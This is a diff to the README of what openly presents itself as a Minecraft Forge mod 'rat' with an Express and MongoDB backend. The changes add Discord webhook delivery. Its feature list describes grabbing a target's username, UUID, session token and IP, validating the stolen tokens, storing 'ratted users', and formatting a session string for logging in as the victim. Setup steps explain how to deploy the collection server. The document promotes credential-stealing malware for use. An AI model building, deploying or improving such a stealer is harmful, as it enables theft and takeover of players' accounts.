@@ -9,6 +9,7 @@
 ![](https://img.shields.io/badge/MC--VERSION-FORGE_1.8.9-0?style=for-the-badge)
 ![](https://img.shields.io/badge/Express.js-000000?style=for-the-badge&logo=express&logoColor=white)
 ![](https://img.shields.io/badge/MongoDB-4EA94B?style=for-the-badge&logo=mongodb&logoColor=white)
+![](https://img.shields.io/badge/Discord-5865F2?style=for-the-badge&logo=discord&logoColor=white)
 
 </div>
 
@@ -16,25 +17,26 @@
 
 ## Features
 - Grabs the **username, uuid, token and ip** of a target as a *JSON*.
-- JavaScript Backend server which:
-  - Checks if the token is valid before adding to the database.
-  - Checks if all fields in the json are present.
-  
-  therefore filtering out spam requests.
-  
 - Additionally, it stores a **formatted session string** ready to use with [DxxxxY/TokenAuth](https://github.com/DxxxxY/TokenAuth).
-
+- JavaScript backend server which:
+  - Checks if all fields in the json are present.
+  - Validates the token before proceeding.
+  
+  therefore filtering out spam requests and fake data.
+- Makes nuking/trolling impossible, due to webhook/database urls private.
 - Can be easily be hosted on *Heroku*.
+- Can be easily configured to either use `Discord Webhooks` or `MongoDB` or both.
 
 - Uses:
-  - *MongoDB* for for storing ratted users.
   - *Express* for the backend server.
+  - *MongoDB* for storing ratted users.
+  - *Discord API* for sending messages to webhook.
 
 ## Setup
 - Server
   1. Clone the repository.
   2. Install dependencies.
-  3. Create a .env file with your database url.
+  3. Create a .env file with your webhook/database url.
   3. Run the server (don't forget to change some strings).
 
 - Mod
